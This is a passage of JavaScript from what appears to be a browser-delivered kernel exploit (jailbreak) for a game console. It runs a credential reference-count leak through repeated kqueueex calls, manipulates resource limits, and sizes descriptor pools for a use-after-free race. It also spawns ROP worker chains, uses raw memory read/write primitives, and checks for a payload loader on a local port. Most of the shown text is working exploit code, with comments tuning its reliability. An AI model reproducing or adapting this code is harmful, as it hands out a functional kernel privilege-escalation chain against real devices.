                    window.syncMark("TRIPLET", "round " + round_ + "/" + max_rounds
                        + " DONE master=" + master_idx + " exclude=" + exclude_idx
                        + " items=" + items.length);
            }
            return -1;
        }

        function triplets_valid(S) {
            return S.triplets[0] >= 0 && S.triplets[1] >= 0 && S.triplets[2] >= 0
                && S.triplets[1] < S.ipv6_count && S.triplets[2] < S.ipv6_count;
        }

        function repair_triplets(S) {
            // S._poisoned is the socket stage1 freed to make room for the kqueue: its
            // ip6po_rthdr aliases that live kqueue, so spraying it does
            // free(kqueue, M_IP6OPT). This guard normally does nothing (it only fires when
            // an index went out of range) but stage2 calls it a dozen times, so it must
            // carry the same exclusion as the stage1 repair.
            const px = (S._poisoned === undefined) ? null : S._poisoned;
            if (S.triplets[1] < 0 || S.triplets[1] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST, px);
                    if (S.triplets[1] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            if (S.triplets[2] < 0 || S.triplets[2] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST, px);
                    if (S.triplets[2] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            return triplets_valid(S);
        }

        async function prepare_fds(S) {

            // Already jailbroken? Then the payload menu is what is wanted, and
            // re-running the UAF on a patched kernel risks a panic. Checked HERE,
            // at the top of the function that owns the ~hour of work, not later.
            // ?force=1 overrides, same as the loader-side check.
            if (!/[?&]force=1/i.test(location.search) && elfldr_alive()) {
                window.syncMark("ELFLDR-UP",
                    "connect(127.0.0.1:9021)=0 - already jailbroken, skipping the leak");
                try { localStorage.setItem("slopkit-poops:jb-at", String(Date.now())); } catch (e) { }
                try { sessionStorage.setItem("slopkit-poops:jb", "1"); } catch (e) { }
                window.liveStatus("ALREADY JAILBROKEN"
                    + "\nelfldr is already listening on :9021"
                    + "\nskipping the exploit - opening the payload menu", 100, "race");
                try { window.showWin(); } catch (e) { }
                S._skipped_jailbroken = true;
                return;
            }

            const rl = malloc(16);
            syscall(0xC2n, 8n, rl);                 // getrlimit(RLIMIT_NOFILE=8)
            const nofile_hard = read64(rl + 8n);
            write64(rl, nofile_hard);
            write64(rl + 8n, nofile_hard);
            syscall(SYSCALL.setrlimit, 8n, rl);

            // RAISE RLIMIT_KQUEUES (13) TOO - THIS IS WHAT MADE THE LEAK A NO-OP.
            // sys_kqueueex does:  mov esi,0xd ; call lim_cur ; call chgkqcnt(uip,1,lim)
            //                     test eax,eax ; je -> ENOMEM ; ret     <-- BEFORE crhold
            // and its copyinstr-EFAULT cleanup NEVER calls chgkqcnt(uip,-1), so the
            // per-uidinfo kqueue count only ever climbs. Once it reaches RLIMIT_KQUEUES
            // every later kqueueex bails out early - no kqueue, no crhold, NO cred leak.
            // p2jb only ever raised RLIMIT_NOFILE, so the 2^32 grind leaked a few
            // thousand refs and then did nothing at all: cr_ref could never reach 0,
            // which is exactly the deterministic 96/96 + "NO_FREE after 3360 closes".
            // DIRECT TEST OF THE LEAK PRIMITIVE. Everything downstream assumes each
            // kqueueex(POC_ARG) takes the copyinstr-EFAULT path: chgkqcnt ok -> falloc ->
            // crhold -> kq_cred -> copyinstr FAILS -> free(kq) with no crfree => 1 leaked
            // cred ref. Verify instead of assuming - the return value distinguishes every
            // case: 14=EFAULT (leak path, what we want), 12=ENOMEM (chgkqcnt refused),
            // 0=SUCCESS (no leak at all, and it burns an fd per call), 9=EBADF, etc.
            {
                const POC = 0x800000000000n;
                let rets = [];
                for (let t = 0; t < 4; t++)
                    rets.push(toHex(syscall(SYSCALL.kqueueex, POC)));
                window.syncMark("KQ-PROBE", "kqueueex(POC_ARG) rets=" + rets.join(",")
                    + "  (want 0xe=EFAULT -> leak path; 0x0=SUCCESS -> NO leak;"
                    + " 0xc=ENOMEM -> chgkqcnt refused)");
            }
            const rlk = malloc(16);
            syscall(0xC2n, 13n, rlk);               // getrlimit(RLIMIT_KQUEUES=13)
            const kq_soft_before = read64(rlk);
            const kq_hard = read64(rlk + 8n);
            write64(rlk, kq_hard);                  // soft := hard
            write64(rlk + 8n, kq_hard);
            const kq_set = syscall(SYSCALL.setrlimit, 13n, rlk);
            syscall(0xC2n, 13n, rlk);               // read back to prove it took
            window.syncMark("RLIMIT-KQ", "before soft=" + kq_soft_before + " hard=" + kq_hard
                + " setret=" + toHex(kq_set)
                + " after soft=" + read64(rlk) + " hard=" + read64(rlk + 8n));

            // ================= KQCNT: EXACT readout of executed leak calls =================
            // The 2^32 leak plan rests on a number that has never been measured: how many
            // kqueueex calls the ROP driver ACTUALLY executes. Progress counts pipe bytes
            // consumed, not syscall returns, so a systematic factor anywhere in the chain
            // is invisible and produces exactly what we see - a deterministic, zero-variance
            // stage0 failure.
            //
            // sys_kqueueex gives us an in-band counter for free:
            //     mov esi, 0xd ; call lim_cur      ; RLIMIT_KQUEUES
            //     call chgkqcnt                    ; charges ui_kqcnt +1
            //     je -> ENOMEM (0xC)               ; returns BEFORE crhold
            //     ... call crhold                  ; the leak
            // and the copyinstr-EFAULT cleanup frees the kqueue with NO crfree and NO
            // chgkqcnt(-1) - so ui_kqcnt only ever CLIMBS, exactly once per call that
            // reached crhold. Therefore "does kqueueex still return EFAULT under soft
            // limit X" is monotone in X, and binary search recovers ui_kqcnt exactly.
            // No kernel read, no jailbreak, ~40 syscalls.
            //
            // Caveat, deliberate: each probe that returns EFAULT itself charges +1, so the
            // result is accurate to about +40. Irrelevant against a count in the billions.
            const KQ_INF = 0x7FFFFFFFFFFFFFFFn;
            const _rlk2 = malloc(16);
            const kq_set_soft = (X) => {
                write64(_rlk2, X); write64(_rlk2 + 8n, kq_hard);
                return syscall(SYSCALL.setrlimit, 13n, _rlk2);
            };
            // true  => ui_kqcnt < X (call was charged, took the EFAULT leak path)
            // false => ui_kqcnt >= X (chgkqcnt refused, ENOMEM, no crhold)
            const kq_under = (X) => {
                kq_set_soft(X);
                return (syscall(SYSCALL.kqueueex, 0x800000000000n) & 0xFFFFFFFFn) !== 0xCn;
            };
            function measure_kqcnt(tag) {
                const HI = 1n << 34n;              // ceiling above a full 2^32 leak
                // NEVER probe with limit 0. chgkqcnt -> chglimit guards with
                //     if (diff > 0 && max != 0)
                // so max==0 means UNLIMITED, not "refuse everything" - the one value that
                // cannot work. v62 probed 0, saw the call still charged, and wrongly
                // declared the model broken. Lower bound is 1.
                if (kq_under(1n)) {                // ui_kqcnt < 1 => counter is 0, nothing ran
                    kq_set_soft(kq_hard);
                    window.syncMark("KQCNT-" + tag, "ui_kqcnt=0 (no charged calls yet)");
                    return 0n;
                }
                if (!kq_under(HI)) {
                    kq_set_soft(kq_hard);
                    window.syncMark("KQCNT-" + tag, "count exceeds ceiling 2^34 (unexpected)");
                    return null;
                }
                let lo = 1n, hi = HI;              // kq_under(lo)=false, kq_under(hi)=true
                for (let i = 0; i < 48 && lo + 1n < hi; i++) {
                    const mid = (lo + hi) / 2n;
                    if (kq_under(mid)) hi = mid; else lo = mid;
                }
                kq_set_soft(kq_hard);              // RESTORE - a small soft limit here would
                syscall(0xC2n, 13n, _rlk2);        // cap the real leak at X and silently kill it
                const restored = read64(_rlk2);
                window.syncMark("KQCNT-" + tag, "ui_kqcnt=" + lo
                    + " (0x" + lo.toString(16) + ")  restored_soft=" + restored
                    + (restored === kq_hard ? " OK" : " *** RESTORE FAILED ***"));
                return lo;
            }
            window.__kqcnt_start = measure_kqcnt("START");
            window.__measure_kqcnt = measure_kqcnt;

            /* STALE BOOT GUARD. A fresh boot reads ui_kqcnt in the low hundreds (147 retail;
               155 / 202 / 207 / 214 seen on the devkit and elsewhere). Far above that means
               an earlier run already leaked on THIS boot: those are kq_cred references that
               are never crfree'd, so they survive until a power-cycle.
               Such a run CANNOT succeed. TOTAL_SYSCALLS = 2^32 + 1 - free_fds_num is sized
               to wrap cr_ref to zero FROM A FRESH BOOT, so starting N refs in overshoots the
               wrap by N and leaves cr_ref at ~N instead of ~0. Neither the pre-burn nor the
               race can close tens of millions of refs, and it fails clean at twins=<all>
               reclaim=0 - one hour later. The arithmetic cannot notice: `executed` is
               measured RELATIVE to __kqcnt_start while the kernel's cr_ref is absolute.
               Seen for real 2026-08-27 10:23 - an external 12.40 console started at
               78,454,955 (about one minute of a previous leak) and was already doomed.
               ?ignorekqcnt=1 overrides. */
            {
                const KQCNT_FRESH_MAX = 100000n;   // ~500x the highest fresh boot seen
                const k0 = window.__kqcnt_start;
                const ignore = /[?&]ignorekqcnt=1/i.test(location.search);
                if (k0 !== null && k0 !== undefined && k0 > KQCNT_FRESH_MAX) {
                    window.syncMark("KQCNT-STALE-BOOT",
                        "ui_kqcnt=" + k0 + " but a fresh boot reads ~150-215."
                        + " THIS BOOT HAS ALREADY LEAKED - the run cannot cross and would"
                        + " fail after ~55 minutes."
                        + (ignore ? "  [?ignorekqcnt=1 - continuing anyway]"
                                  : "  POWER-CYCLE the console and launch again."));
                    if (!ignore) {
                        try {
                            window.liveStatus("THIS BOOT HAS ALREADY LEAKED"
                                + "\nui_kqcnt=" + k0 + " (a fresh boot reads ~150-215)"
                                + "\nan earlier run left cr_ref advanced;"
                                + " only a reboot clears it"
                                + "\n\nPOWER-CYCLE THE CONSOLE, then launch again.",
                                0, "setup");
                        } catch (e) { }
                        fail("stale boot: ui_kqcnt=" + k0 + " - power-cycle required"
                             + " (?ignorekqcnt=1 to override)");
                    }
                }
            }

            const cand = ["/dev/", "/", "/app0/", "/dev/urandom",
                "/dev/notification0", "/dev/gc"];
            let held_path = 0n;
            for (let c = 0; c < cand.length; c++) {
                const sp = alloc_string(cand[c]);
                const a = syscall(SYSCALL.open, sp, 0n);
                if (a === 0xffffffffffffffffn) continue;
                const b = syscall(SYSCALL.open, sp, 0n);
                syscall(SYSCALL.close, a);
                if (b === 0xffffffffffffffffn) continue;
                syscall(SYSCALL.close, b);
                held_path = sp;
                break;
            }
            // POOL PARITY HAZARD. Every fd in this pool must drop EXACTLY ONE ucred ref
            // when closed, because crfree only frees on the precise 1->0 transition
            // (`lock xadd`; `cmp eax,1; jne ret`). A SOCKET drops TWO: f_cred via _fdrop
            // AND so_cred, which socreate crhold'd separately. With a stride of 2 and the
            // wrong parity cr_ref steps 3 -> 1 -> 0xFFFFFFFF, skipping 0, and the ucred is
            // NEVER freed - a deterministic failure indistinguishable from "C0 too big".
            // In a sandboxed WebProcess the path candidates above are exactly what fails,
            // so the socket fallback is the LIKELY path, not the exotic one.
            // A pipe fd is a plain struct file: one f_cred ref from falloc, no second
            // credential, so closing it decrements exactly 1. And pipe() needs no path.
            const pipe_cache = [];
            const new_pipe_fd = () => {
                if (pipe_cache.length === 0) {
                    // create_pipe THROWS on failure, and pool exhaustion is the EXPECTED
                    // stop condition for the probe loop - let it throw and stage0 dies
                    // instead of simply ending the probe. Convert to the -1 sentinel.
                    let pr;
                    try { pr = create_pipe(); } catch (e) { return 0xffffffffffffffffn; }
                    if (!pr) return 0xffffffffffffffffn;
                    pipe_cache.push(Number(pr[0]), Number(pr[1]));
                }
                return BigInt(pipe_cache.shift());
            };
            window.syncMark("POOL-SRC", held_path !== 0n
                ? "path-backed (1 ucred ref per close) - OK"
                : "no path opened -> using PIPES (1 ref per close);"
                  + " sockets would drop 2 and could skip the 1->0 transition");
            const new_free_fd = () => held_path !== 0n
                ? syscall(SYSCALL.open, held_path, 0n)
                : new_pipe_fd();          // pipes, NOT sockets - see POOL PARITY above

            // DO NOT probe to exhaustion. The original opened up to 8192 fds to measure
            // the budget, which drains the SYSTEM-WIDE maxfiles from the WebProcess (a much
            // larger allowance than Y2JB's host app). Observed on UART: SysCore's
            // sceKernelOpen("/dev") then fails with 0x80020018 (EMFILE), it asserts, dies,
            // and the console shuts down - which looks exactly like a random kernel panic.
            // We only need free_fds_num >= BURST_MIN (~123), so take a bounded slice and
            // leave the rest of the system its descriptors.
            // Pool must EXCEED R_base: after the leak + pool creation cr_ref == R_base+1,
            // and only closing fds walks it down (opening one re-adds a ref, so cycling is
            // net-zero). The v49 burn closed 800 with NO free => R_base > 800, so a 1024
            // pool can never reach 0. Raise it - but NOT by probing to exhaustion: that
            // drained system-wide maxfiles and killed SysCore (EMFILE -> console shutdown).
            // 4096 is well under the 8192 that did that, and we stop at the cap, not at
            // failure, so the rest of the system keeps its descriptors.
            const FD_PROBE_MAX = 8192;   // C0 measured >3360; reach further (still CAPPED, not to exhaustion)
            // MEASURE THE REAL DESCRIPTOR CEILING FIRST. Every number below depends on it,
            // and RLIMIT_NOFILE was being raised WITHOUT CHECKING that it took.
            {
                const rl = malloc(16);
                syscall(0xC2n, 8n, rl);                       // getrlimit(RLIMIT_NOFILE)
                const soft0 = read64(rl), hard0 = read64(rl + 8n);
                write64(rl, hard0); write64(rl + 8n, hard0);
                const sret = syscall(SYSCALL.setrlimit, 8n, rl);
                syscall(0xC2n, 8n, rl);                       // read back - proves it took
                window.syncMark("RLIMIT-NOFILE", "before soft=" + soft0 + " hard=" + hard0
                    + " setret=" + toHex(sret)
                    + " after soft=" + read64(rl) + " hard=" + read64(rl + 8n));
            }

            // PROBE FOR *REAL* DESCRIPTORS ONLY.
            // Our syscall path returns RAX only - the ROP chain never captures CF - so a
            // FAILED open() returns errno as a SMALL POSITIVE NUMBER that sails past a
            // `=== -1` guard and gets stored as an fd. MEASURED: this probe reported
            // "opened=8192/8192" while the pool it sized was 7035/7680 copies of the
            // literal value 24 = EMFILE. Everything downstream inherited that lie:
            // free_fds_num, TOTAL_SYSCALLS, and therefore cr_ref itself, which then wrapped
            // NEGATIVE and could never reach 0 (the NO FREE after 7456 closes).
            // Worse, the cleanup below then closed fd 24 thousands of times, destroying the
            // real object living there - that is the "flaky EBADF sock[9]/fd24" we kept
            // excluding as an artifact. We were killing it ourselves.
            // open() hands back the LOWEST AVAILABLE descriptor, so real opens are STRICTLY
            // INCREASING. Anything that does not increase is an errno. No CF gadget needed.
            const probe_fds = [];
            let probe_prev = -1, probe_bogus = 0, probe_first_bogus = -1n;
            for (let i = 0; i < FD_PROBE_MAX; i++) {
                const pfd = new_free_fd();
                if (pfd === 0xffffffffffffffffn) break;
                const n = Number(pfd & 0xFFFFFFFFn);
                if (n <= probe_prev || n < 3) {               // errno, not a descriptor
                    probe_bogus++;
                    if (probe_first_bogus < 0n) probe_first_bogus = pfd;
                    break;                                     // ceiling reached - STOP
                }
                probe_prev = n;
                probe_fds.push(pfd);
            }
            if (probe_bogus)
                window.syncMark("FD-CEILING", "open() started returning errno "
                    + toHex(probe_first_bogus) + " after " + probe_fds.length
                    + " REAL fds (24=EMFILE). Everything is sized from the real count now.");
            // C0 ESTIMATE, free of charge. fd numbers are lowest-available, so the FIRST
            // fd the probe receives is approximately how many descriptors the WebProcess
            // ALREADY holds - and every open file holds an f_cred, so that number is the
            // dominant term in C0 (plus one td_ucred per thread, plus p_ucred). Until now
            // C0 was only bounded from below by burn failures costing ~50 min each; this
            // reads it in the first seconds of a run.
            window.syncMark("FD-BASE", "first_fd=" + (probe_fds.length ? probe_fds[0] : -1)
                + " last_fd=" + (probe_fds.length ? probe_fds[probe_fds.length - 1] : -1)
                + " => browser already holds ~" + (probe_fds.length ? Number(probe_fds[0]) : 0)
                + " fds; C0 ~ that + threads + 1");
            window.syncMark("FD-PROBE", "opened=" + probe_fds.length + "/" + FD_PROBE_MAX
                + (probe_fds.length === FD_PROBE_MAX ? " (capped, system headroom preserved)"
                                                     : " (hit process limit early)"));
            const fd_budget = probe_fds.length;
            // Close only what we REALLY opened, and check every close. Closing an errno
            // value here is what destroyed fd 24 on previous runs.
            let probe_close_fail = 0;
            for (let i = 0; i < probe_fds.length; i++) {
                const r = toBigSafe(syscall(SYSCALL.close, BigInt(probe_fds[i])));
                if ((r & 0xFFFFFFFFn) !== 0n) probe_close_fail++;
            }
            if (probe_close_fail)
                window.syncMark("FD-PROBE-CLOSE", "*** " + probe_close_fail + "/"
                    + probe_fds.length + " probe closes FAILED - descriptors still held,"
                    + " the pool will be short ***");

            // SIZE THE POOL FROM THE REAL CEILING. The cap used to be a hardcoded 7680,
            // which is what let TOTAL_SYSCALLS be computed against fds we could never open.
            let free_fds_num = fd_budget - 96;
            if (free_fds_num > 7680) free_fds_num = 7680;
            window.syscallBatch ? 0 : 0;
            window.syncMark("FD-BUDGET", "real_ceiling=" + fd_budget
                + " -> free_fds_num=" + free_fds_num
                + "  (TOTAL_SYSCALLS is derived from THIS number, so it must be honest:"
                + " cr_ref = C0 + 1 only if we later open EXACTLY this many real fds)");

            const R_ESTIMATE = 69 + 12 + 1 + 1;
            const BURST_MIN = R_ESTIMATE + 40;
            if (free_fds_num < BURST_MIN)
                fail("fd budget too small: free_fds_num=" + free_fds_num +
                    " must exceed R~" + R_ESTIMATE + " with margin (need >=" +
                    BURST_MIN + "); fd_budget=" + fd_budget);

            syscall(SYSCALL.setuid, 1n);

            await js_sleep(10000);

            // FAST-ITERATION MODE (?skipleak=1): run the IDENTICAL code path but with a
            // tiny syscall budget so the ~40min cr_ref feed finishes in seconds. The race
            // cannot WIN without the real overflow, but every protocol/deadlock bug in
            // setup_workers -> flush_iov_workers -> attempt_race reproduces immediately.
            // Turns a 40-minute debug cycle into about a minute.
            const TOTAL_SYSCALLS = _skipleak
                ? (BigInt(free_fds_num) + 0x20000n)
                : (0x100000001n - BigInt(free_fds_num));
            if (_skipleak) window.syncMark("SKIPLEAK", "budget=" + TOTAL_SYSCALLS + " (protocol debug only, race cannot win)");

            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const LEAK_UNROLL = 4096;
            const U = BigInt(LEAK_UNROLL);

            const NW = LEAK_CORES.length;
            const FEED_CHUNK = 4096;

            const chunkbuf = malloc(FEED_CHUNK);

            const base_share = TOTAL_SYSCALLS / BigInt(NW);
            const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
            const lws = [];
            for (let w = 0; w < NW; w++) {
                const target_w = base_share + (w === 0 ? extra0 : 0n);
                const bplus1_w = target_w / U;
                // KEEP THE -1. Verified against the ROP chain: the driver flips the pivot
                // to exitAddr and THEN writes one final byte, which drives one extra full
                // loop iteration (read + LEAK_UNROLL kqueueex) before the chain reaches
                // EXIT and runs `remainder`. So executed = (normal+1)*U + remainder =
                // bplus1*U + remainder = target EXACTLY. Removing the -1 overshoots by
                // U per worker (12288 total), which wraps cr_ref the other way and fails
                // identically. The leak count was never the bug.
                const normal_w = bplus1_w - 1n;
                const remainder_w = target_w - bplus1_w * U;
                const [pr, pw] = create_pipe();
                const rfd = Number(pr), wfd = Number(pw);

                syscall(SYSCALL.fcntl, BigInt(wfd), F_SETFL, O_NONBLOCK);
                const finished = malloc(8); write64(finished, 0n);
                const dummybuf = malloc(8);
                const chain = build_leak_worker_chain(
                    LEAK_CORES[w], rfd, finished, dummybuf, LEAK_UNROLL,
                    Number(remainder_w));
                await ulog("SPAWN-" + w + "-PRE core=" + LEAK_CORES[w] + " entry=" + toHex(chain.entry));
                const _th = spawn_leak_worker(chain.entry);
                await ulog("SPAWN-" + w + "-POST handle=" + toHex(_th));
                await js_sleep(250);   // let the worker's chain start + beacon flush (diagnose SIGILL point)
                await ulog("SPAWN-" + w + "-ALIVE main survived after worker " + w);
                const pendbuf = malloc(4); write32(pendbuf, 0n);
                lws.push({
                    chain, rfd, wfd, finished, pendbuf,
                    normal: normal_w, queued: 0n
                });
            }
            await ulog("SPAWN-DONE all " + NW + " workers spawned, entering feed");
            window.liveStatus("STAGE 0 - leak workers up, starting feed", 0);

            let all_fed = false;
            const total_need = lws.reduce((a, l) => a + l.normal, 0n);
            while (!all_fed) {
                all_fed = true;
                for (const lw of lws) {
                    if (lw.queued < lw.normal) {
                        all_fed = false;
                        let want = lw.normal - lw.queued;
                        if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
                        const n = syscall(SYSCALL.write, BigInt(lw.wfd),
                            chunkbuf, want);
                        if (n > 0n && n <= BigInt(FEED_CHUNK)) lw.queued += n;
                    }
                }
                // TRUE progress = bytes the workers have actually CONSUMED, not bytes we
                // wrote. A pipe buffers 64KB, which is exactly 25% of each worker's
                // 262142-byte share, so "queued" alone reports an instant fake 25% and
                // still owes that work at "100%". FIONREAD on the read end gives the
                // bytes still sitting unread, so consumed = queued - pending. One batched
                // ioctl round trip for all workers, so it costs nothing.
                // Per-call (not batched) so the ioctl RETURN is checked: a batched call
                // discards it, which silently reported in-pipe=0 while the pipes were
                // actually full. Only 3 round trips per 500ms tick - negligible.
                let pending = 0n, fioOK = true;
                for (const l of lws) {
                    write32(l.pendbuf, 0n);
                    const r = syscall(SYSCALL.ioctl, BigInt(l.rfd), FIONREAD, l.pendbuf);
                    if ((r & 0xFFFFFFFFn) !== 0n) { fioOK = false; break; }
                    // read32 already returns a BigInt here (adapter contract), so `>>> 0`
                    // is a TypeError — BigInt has no unsigned right shift. Mask instead.
                    pending += read32(l.pendbuf) & 0xFFFFFFFFn;
                }
                if (!window.__fioMarked) {
                    window.__fioMarked = 1;
                    window.syncMark("FIONREAD", "ok=" + fioOK + " pending=" + pending);
                }
                if (!fioOK) pending = 0n;
                const fed_b = lws.reduce((a, l) => a + l.queued, 0n);
                let done_b = fed_b - pending;
                if (done_b < 0n) done_b = 0n;
                const pct = Number((done_b * 10000n) / total_need) / 100;
                window.liveStatus(
                    "STAGE 0 - cr_ref leak (" + NW + " cores, " + LEAK_UNROLL + "x unroll)\n"
                    + "consumed " + done_b + " / " + total_need + " bytes = "
                    + (done_b * U) + " kqueueex\n"
                    + "queued " + fed_b + "  in-pipe " + pending + "\n"
                    + "per-core: " + lws.map(l => (Number((l.queued * 1000n) / l.normal) / 10).toFixed(1) + "%").join("  "),
                    pct, "leak");
                try {
                    const _now = Date.now();
                    if (!window.__kqSampleAt || _now - window.__kqSampleAt > 15000) {
                        window.__kqSampleAt = _now;
                        const _r = syscall(SYSCALL.kqueueex, POC_ARG) & 0xFFFFFFFFn;   /* POC is block-scoped
                             at the KQ-PROBE site and NOT visible here; POC_ARG is the
                             one in scope. Referencing POC threw a ReferenceError that
                             this try/catch swallowed, so the sampler silently did
                             nothing on the first two 4-core runs. */
                        window.__kqSamples = window.__kqSamples || { e: 0, nomem: 0, ok: 0, other: 0 };
                        if (_r === 0xen) window.__kqSamples.e++;
                        else if (_r === 0xcn) window.__kqSamples.nomem++;
                        else if (_r === 0n) window.__kqSamples.ok++;
                        else window.__kqSamples.other++;
                        const _t = window.__kqSamples;
                        window.syncMark("KQ-PATH-SAMPLE", "ret=0x" + _r.toString(16)
                            + (_r === 0xen ? " EFAULT(leak ok)"
                             : _r === 0xcn ? " ENOMEM(chgkqcnt REFUSED - calls dropped)"
                             : _r === 0n ? " SUCCESS(no leak this call)" : " unexpected")
                            + " totals: efault=" + _t.e + " enomem=" + _t.nomem
                            + " success=" + _t.ok + " other=" + _t.other);
                    }
                } catch (e) { }
                await js_sleep(500);
            }
            /* LEAK-PATH SAMPLING (local instrumentation).
               The leak came up 2,277,951 calls short of what was issued, while
               DRAIN-ACCT proved 0 calls were lost in the pipes -- so that many kqueueex
               calls ran without incrementing ui_kqcnt. sys_kqueueex only increments via
               chgkqcnt BEFORE the copyinstr-EFAULT path, so a call that fails ENOMEM at
               chgkqcnt never counts. The shortfall moved 2,007,028 -> 2,293,748 between
               runs while `want` moved by 3, which points at a variable ENOMEM rate
               rather than a wrong formula.
               The unrolled ROP chain discards every return, so the rate cannot be read
               from it without storing 4.29e9 results. Sample instead: one kqueueex(POC)
               from the main thread per drain pass. One extra syscall against ~4.29e9
               cannot move the counters meaningfully, and it tests the hypothesis.
                  0xe EFAULT -> leak path healthy, this call DID count
                  0xc ENOMEM -> chgkqcnt refused, calls are being dropped
                  0x0        -> succeeded, no leak on this call */
            try {
                const _s = window.__kqSamples;
                if (_s) window.syncMark("KQ-PATH-SUMMARY",
                    "efault=" + _s.e + " enomem=" + _s.nomem + " success=" + _s.ok
                    + " other=" + _s.other
                    + (_s.nomem > 0
                        ? " -- ENOMEM OBSERVED: chgkqcnt refused during the leak, which is"
                          + " the shortfall mechanism"
                        : " -- no ENOMEM sampled; if the leak is still short the uncounted"
                          + " calls are NOT chgkqcnt refusals"));
            } catch (e) { }
            window.liveStatus("STAGE 0 - feed COMPLETE, draining workers", 100, "leak");

            // DRAIN PHASE. The feed loop has queued every byte, but up to 64KB per worker
            // is still sitting in the pipes - ~152K bytes total, i.e. ~625M kqueueex, which
            // is 8-10 more minutes of real work. This used to report a flat pct=100 and
            // then go silent for all of it, which is indistinguishable from a hang and is
            // the single worst part of the run to watch.
            //
            // The bytes still buffered are directly measurable: the same FIONREAD the feed
            // loop already uses. Since every worker is fully queued by now, "queued" is
            // constant at total_need, so consumed = total_need - pending and the SAME
            // progress formula carries straight through the drain. 3 ioctls per 1.5s tick
            // costs nothing next to what the workers are doing.
            const drainPending = () => {
                let pend = 0n;
                for (const l of lws) {
                    write32(l.pendbuf, 0n);
                    const r = syscall(SYSCALL.ioctl, BigInt(l.rfd), FIONREAD, l.pendbuf);
                    if ((r & 0xFFFFFFFFn) !== 0n) return null;   // unreadable: fall back to elapsed
                    pend += read32(l.pendbuf) & 0xFFFFFFFFn;
                }
                return pend;
            };
            const drainReport = (di) => {
                const pend = drainPending();
                if (pend === null) {
                    window.liveStatus("STAGE 0 - DRAINING pipes (worker " + (di + 1) + "/" + lws.length + ")"
                        + "\nFIONREAD unavailable - no byte count, still draining", -1, "drain");
                    return;
                }
                const done_b = total_need > pend ? total_need - pend : total_need;
                const pct = Number((done_b * 10000n) / total_need) / 100;
                window.liveStatus("STAGE 0 - DRAINING buffered backlog"
                    + "\nworkers are consuming the bytes already queued in the pipes"
                    + "\nconsumed " + done_b + " / " + total_need + " bytes = "
                    + (done_b * U) + " kqueueex"
                    + "\nstill in pipes " + pend + "   worker " + (di + 1) + "/" + lws.length,
                    pct, "drain");
            };
            drainReport(0);
            for (let di = 0; di < lws.length; di++) {
                const lw = lws[di];
                window.syncMark("DRAIN", "worker=" + di + "/" + lws.length + " waiting");
                let spins = 0;
                while (true) {
                    write64(lw.finished, 0n);
                    await js_sleep(1500);
                    if (read64(lw.finished) === 0n) break;
                    drainReport(di);
                    if ((++spins % 20) === 0)
                        window.syncMark("DRAIN", "worker=" + di + " still draining, " + (spins * 1.5) + "s");
                }
                window.syncMark("DRAIN", "worker=" + di + " DONE");
            }
            window.liveStatus("STAGE 0 - drain COMPLETE, all workers idle", 100, "drain");

            for (const lw of lws) {
                write64(lw.chain.pivotAddr, lw.chain.exitAddr);
                write64(lw.finished, 0n);
                syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, 1n);
            }
            for (let di = 0; di < lws.length; di++) {
                const lw = lws[di];
                const dl = Date.now() + 15000;
                while (read64(lw.finished) !== EXIT_MARK && Date.now() < dl)
                    await js_sleep(50);
                // LOCALIZE THE LOST ITERATIONS. v63 measured the leak 2,293,746 calls
                // short with no analytic explanation, so report per worker: how many
                // bytes were fed, how many are STILL SITTING UNREAD in the pipe (each
                // unread byte = LEAK_UNROLL calls never executed), and whether the
                // worker actually reached EXIT_MARK or the 15s timeout fired and we
                // closed the pipe out from under it.
                write32(lw.pendbuf, 0n);
                const fio = syscall(SYSCALL.ioctl, BigInt(lw.rfd), FIONREAD, lw.pendbuf);
                const left = (fio & 0xFFFFFFFFn) === 0n
                    ? (read32(lw.pendbuf) & 0xFFFFFFFFn) : -1n;
                const reachedExit = read64(lw.finished) === EXIT_MARK;
                window.syncMark("DRAIN-ACCT", "worker=" + di
                    + " queued=" + lw.queued + " normal=" + lw.normal
                    + " unread=" + left + " (= " + (left > 0n ? left * U : 0n) + " calls lost)"
                    + " exit=" + (reachedExit ? "EXIT_MARK" : "*** 15s TIMEOUT ***"));
                syscall(SYSCALL.close, BigInt(lw.rfd));
                syscall(SYSCALL.close, BigInt(lw.wfd));
            }

            // GROUND TRUTH. Every previous stage0 post-mortem re-derived the leak count from
            // the chain source; this reads it out of the kernel. executed == TOTAL_SYSCALLS
            // means the ucred WAS freed and the failure is reclaim (zone isolation), which
            // no amount of spray tuning fixes. executed < TOTAL means cr_ref never wrapped
            // and the bug is arithmetic - which is fixable and explains 96/96 zero variance.
            if (window.__kqcnt_start !== null && window.__kqcnt_start !== undefined) {
                const kq_end = window.__measure_kqcnt("END");
                if (kq_end !== null) {
                    const executed = kq_end - window.__kqcnt_start;
                    const want = TOTAL_SYSCALLS;
                    const ratio = want === 0n ? 0 : Number((executed * 10000n) / want) / 10000;
                    window.syncMark("KQCNT-VERDICT",
                        "executed=" + executed + " want=" + want
                        + " ratio=" + ratio.toFixed(4)
                        + (executed >= want
                            ? "  => LEAK COMPLETE, cr_ref DID wrap; failure is RECLAIM"
                            : "  => LEAK SHORT by " + (want - executed)
                              + "; cr_ref never reached 0 (arithmetic bug, not reclaim)"));

                    // SELF-CORRECTING LEAK - THE FIX.
                    // v63 MEASURED the leak running 2,293,746 calls short
                    // (executed=4292665871 want=4294959617). Sign analysis:
                    //     cr_ref = C0 + executed + N = C0 + 1 - short   (mod 2^32)
                    // and short >> C0+1, so it wraps NEGATIVE to ~4.29e9 - unreachable by
                    // ANY number of fd closes (the burn walked the whole 7456 pool with
                    // euid/ruid never moving off 0x1). That one fact explains every prior
                    // stage0 failure; nothing downstream was ever wrong.
                    // The lost iterations are not localizable analytically (the feed writes
                    // exactly `normal` bytes, and the drain only breaks after 1500ms of
                    // zero progress), so instead of chasing them, top the count up to
                    // EXACTLY `want` using the same counter that measured the deficit.
